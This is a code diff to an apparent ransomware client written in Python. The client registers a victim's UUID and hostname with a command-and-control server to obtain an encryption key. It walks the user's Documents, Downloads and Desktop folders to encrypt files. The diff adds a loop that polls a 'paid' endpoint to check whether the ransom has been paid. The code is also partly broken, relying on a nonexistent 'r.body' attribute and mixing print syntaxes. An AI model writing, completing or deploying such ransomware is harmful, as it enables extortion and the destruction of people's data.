@@ -1,7 +1,12 @@
 # get a KEY from the C&C server
 
-import requests, uuid, os
+import requests, json, uuid, os
 from ransomcrypto import *
+
+excluded_filetypes = ['.enc','.exe', '.bat', '.tar.gz', '.js', '.html', '.py']
+included_filetypes = ['.zozo']
+
+priority_dirs = ['Documents', 'Downloads', 'Desktop'] # would normally do all folders in users home dir
 
 
 UUID = uuid.uuid4()
@@ -10,23 +15,24 @@ encryption_key = ""
 
 # register with C&C server
 while encryption_key == "":
-    url = 'http://localhost:8000/register'
+    url = 'http://localhost:8000/index/register'
     payload = {'uuid': UUID, 'host': host_name}
 
     r = requests.get(url, params=payload)
 
-    if r.status_code == 200:
-        encryption_key = r.text.split("<")[0].strip().encode('utf8')
+    # Check if request body exists
+    if (r.body): #r.status_code == 200:
+
+        try:
+            content = json.loads(r.body)
+            encryption_key = content["encryption_key"]
+            print (" %s ", encryption_key)
+        except ValueError:
+            print ("Bad value")
     else:
         pass
 
-
-
-excluded_filetypes = ['.enc','.exe', '.bat', '.tar.gz', '.js', '.html', '.py']
-
-
-priority_dirs = ['Documents', 'Downloads', 'Desktop'] # would normally do all folders in users home dir
-
+# When encryption key okay
 for target in priority_dirs:
     for dirName, subdirList, fileList in os.walk(os.path.expanduser("~/"+target), topdown=False):
         print dirName
@@ -53,6 +59,27 @@ for target in priority_dirs:
 
                 # onto the next
 
+paid = 0
+
+while paid == 0:
+    url = 'http://localhost:8000/index/paid'
+    payload = {'uuid': UUID, 'host': host_name}
+
+    r = requests.get(url, params=payload)
+
+    # Check if request body exists
+    if (r.body): #r.status_code == 200:
+
+        try:
+            content = json.loads(r.body)
+            encryption_key = content["encryption_key"]
+            print (" %s ", encryption_key)
+        except ValueError:
+            print ("Bad value")
+
+
+    else:
+        pass
 
 
 # generate kill script and delete self # open URL
